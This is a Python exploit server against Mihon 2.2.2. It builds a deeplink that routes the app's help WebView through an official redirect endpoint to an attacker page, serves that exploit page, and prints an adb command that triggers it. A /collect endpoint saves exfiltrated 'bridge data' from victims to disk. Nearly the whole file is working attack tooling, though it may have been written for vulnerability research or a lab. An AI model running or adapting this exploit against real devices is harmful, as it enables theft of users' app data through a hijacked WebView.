#!/usr/bin/env python3
import argparse
import json
import os
import socket
import time
import urllib.parse as up
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer


OUT_DIR = "received"
EXP_DIR = "exp"
VID = "2.2.2"


def get_local_ip():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.connect(("8.8.8.8", 80))
        ip = sock.getsockname()[0]
        sock.close()
        return ip
    except OSError:
        return "127.0.0.1"


class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = up.urlparse(self.path)
        query = up.parse_qs(parsed.query)
        
        if parsed.path == "/collect":
            data = query.get("d", [""])[0]
            os.makedirs(OUT_DIR, exist_ok=True)
            output = os.path.join(OUT_DIR, f"collected_{int(time.time() * 1000)}.json")
            with open(output, "w", encoding="utf-8") as handle:
                handle.write(data)
            self.respond(200, b"ok", "text/plain; charset=utf-8")
            print(f"[+] Collected bridge data: {output}")
            return

        if parsed.path == f"/exp/{VID}":
            self.serve_file(os.path.join(EXP_DIR, f"{VID}.html"), "text/html; charset=utf-8")
            return

        if parsed.path == "/":
            body = b"Mihon 2.2.2 exploit server running\n"
            self.respond(200, body, "text/plain; charset=utf-8")
            return

        self.respond(404, b"not found", "text/plain; charset=utf-8")

    def serve_file(self, path, content_type):
        if not os.path.exists(path):
            self.respond(404, f"{path} not found".encode(), "text/plain; charset=utf-8")
            return
        with open(path, "rb") as handle:
            data = handle.read()
        self.respond(200, data, content_type)

    def respond(self, code, body, content_type):
        self.send_response(code)
        self.send_header("Content-Type", content_type)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)


def build_deeplink(attacker_base, official_jump_base):
    attack_page = f"{attacker_base.rstrip('/')}/exp/{VID}"
    official_url = f"{official_jump_base}?target={up.quote(attack_page, safe='')}"
    deeplink = f"mihon://help/webview?url={up.quote(official_url, safe='')}"
    return attack_page, official_url, deeplink


def write_config(attacker_base, official_jump_base):
    attack_page, official_url, deeplink = build_deeplink(attacker_base, official_jump_base)
    config = {
        "attackerBase": attacker_base.rstrip("/"),
        "attackPage": attack_page,
        "officialJumpUrl": official_url,
        "deeplink": deeplink,
    }
    with open("exp_config.json", "w", encoding="utf-8") as handle:
        json.dump(config, handle, indent=2)
    return config


def main():
    parser = argparse.ArgumentParser(description="Mihon 2.2.2 redirect handling EXP server")
    parser.add_argument("--host", default="0.0.0.0")
    parser.add_argument("--port", type=int, default=8000)
    parser.add_argument("--public-host", default=get_local_ip())
    parser.add_argument(
        "--official-jump",
        default="http://mihon.app:8080/help/jump",
        help="Official redirect endpoint provided by the sample server.",
    )
    args = parser.parse_args()

    os.makedirs(EXP_DIR, exist_ok=True)
    os.makedirs(OUT_DIR, exist_ok=True)

    attacker_base = f"http://{args.public_host}:{args.port}"
    config = write_config(attacker_base, args.official_jump)

    print("[*] Attack page:", config["attackPage"])
    print("[*] Official jump URL:", config["officialJumpUrl"])
    print("[*] Deeplink:")
    print(config["deeplink"])
    print("[*] ADB trigger:")
    print(f'adb shell am start -a android.intent.action.VIEW -d "{config["deeplink"]}"')

    ThreadingHTTPServer((args.host, args.port), Handler).serve_forever()


if __name__ == "__main__":
    main()
